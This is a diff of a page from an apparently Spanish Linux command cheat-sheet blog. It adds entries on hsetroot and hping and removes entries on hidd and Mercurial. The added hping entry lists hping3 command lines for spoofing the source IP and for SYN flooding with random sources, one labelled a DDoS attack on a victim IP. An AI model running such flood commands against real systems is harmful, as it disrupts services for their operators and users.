@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="(/etc/hosts). Contiene la resolución de &#8220;Hosts&#8221; definidos localmente. La estructura es: IP, nombre del host y alias. 192.168.1.10 &hellip;">
+  <meta name="description" content="Coloca imágen en el fondo de pantalla permitiendo modificar: brillo, contraste, transparencias&#8230; $ hsetroot -clear &#8220;#f6f6f6&#8221; (Borra &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -74,6 +74,104 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/hsetroot/">Hsetroot</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Coloca imágen en el fondo de pantalla permitiendo modificar: brillo, contraste, transparencias&#8230;</p>
+
+<blockquote><p>$ hsetroot -clear &#8220;#f6f6f6&#8221; (Borra el rango de color especificado)</p>
+
+<p>$ hsetroot -center imagen.jpg (coloca la imagen centrada. Otras opciones: -tile: mosaico, -full: respetando proporciones y -fill: redimensiona al tamaño de la pantalla)</p>
+
+<p>$ hsetroot -blur 1.5 imagen.jpg (desenfoca)</p>
+
+<p>$ hsetroot -contrast 30 imagen.jpg (Ajusta el contraste al valor)</p>
+
+<p>$ hsetroot -flipv imagen.jpg (Refleja la imagen vertical. -fliph: horizontal y -flipd: diagonal)</p>
+
+<p>$ hsetroot -alpha 150 imagen.jpg</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/hping/">Hping</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Herramienta de intrusión remota (ataque ICMP)</p>
+
+<blockquote><p># hping3 -I eth0 -S 192.169.2.2  (ping no silencioso)</p>
+
+<p># hping3 -I eth0 -a 192.168.2.158 -S 192.169.2.2  (enmascarando  nuestra IP con una de ficticia-192.168.1.158)</p>
+
+<p># hping3 -I eth0 -a 192.168.2.158 -S 192.168.2.2 -p 135 (Descubrir máquinas que con un ping no responden, enmascarando la IP y especificando un puerto)</p>
+
+<p># hping3 -S -a ip_ficticia -p 80 -k ip_atacada</p>
+
+<p># hping3 -i m100 -S -a ip_ficticia -p 80 -k ip_atacada</p>
+
+<p># hping3 -S 192.168.1.158 &#8211;flood &#8211;rand-source -d 5000 -p 80 (Enviando paquetes lo más rápido posible [flood], simulando orígenes aleatorios [rand-source], tamaño del paquete en bites [d] y puerto de entrada)</p>
+
+<p># hping3 &#8211;rand-source -p 80 -S &#8211;flood ip_victima (ataque DDos a una ip)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -488,123 +586,6 @@ $ kill -9 PID
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/hidd/">Hidd</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Gestionar dispositivos blueetoth</p>
-
-<blockquote><p># hidd &#8211;search (Buscar dispositivos)</p>
-
-<p># hidd &#8211;connect 0A:1B:2C:4D:5E:6F (Conectar a un dispositivo)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/hg/">Hg</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[mercurial]. Mercurial es un potente programa de control de versiones para nuestros proyectos. Previamente crear en la carpeta personal, el archivo:</p>
-
-<blockquote><p>$ nano .hgrc</p></blockquote>
-
-<p>Con el siguiente contenido:</p>
-
-<pre><code>[ui]
-
-username = Juanito Perez juanitoperez@gmail.com
-</code></pre>
-
-<blockquote><p>$ hg init repositorio . (crea un repositorio en el directorio actual o en el que se especifique)</p>
-
-<p>$ hg add  (añade los ficheros existentes en el directorio a nuestro proyecto)</p>
-
-<p>$ hg clone http://servidor.com/hg (clona un repositorio a la carpeta actual)</p>
-
-<p>$ hg clone ssh://usuario@servidor.com/carpeta repositorio (clona &#8220;carpeta&#8221; usando ssh en el directorio &#8220;repositorio&#8221; del directorio actual)</p>
-
-<p>$ hg status (muestra el estado de los ficheros del proyecto)</p>
-
-<p>$ hg commit (realizamos un commit al proyecto)</p>
-
-<p>$ hg push (enviamos los cambios al repositorio remoto)</p>
-
-<p>$ hg pull (recuperamos cambios del repositorio)</p>
-
-<p>$ hg update (Recargar los archivos despues de un pull)</p>
-
-<p>$ hg update -C (Mezclar cambios [merge])</p>
-
-<p>$ hg log (vemos todos los cambios realizados en el proyecto)</p>
-
-<p>$ hg log -r 5 (Muestra la 5ª revisión)</p>
-
-<p>$ hg log -r 2:5 (Muestra de las 2ª a la 5ª revisión)</p>
-
-<p>$ hg log -p -r 6 (Muestra todas las modificaciónes del archivo de la 6ª revisión)</p>
-
-<p>$ hg tip -v (Muestra los datos de la última revisión)</p>
-
-<p>$ hg help comando (vemos la ayuda integrada del hg para el comando)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/90/">&larr; Older</a>
@@ -628,6 +609,22 @@ username = Juanito Perez juanitoperez@gmail.com
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/stumpwm/">stumpwm</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/portsentry/">portsentry</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/exim/">exim</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/dtrx/">dtrx</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/systemctl/">systemctl</a>
       </li>
     
@@ -649,22 +646,6 @@ username = Juanito Perez juanitoperez@gmail.com
     
       <li class="post">
         <a href="/blog/zypper/">zypper</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zmore/">zmore</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zmap/">zmap</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zless/">zless</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zip/">zip</a>
       </li>
     
   </ul>
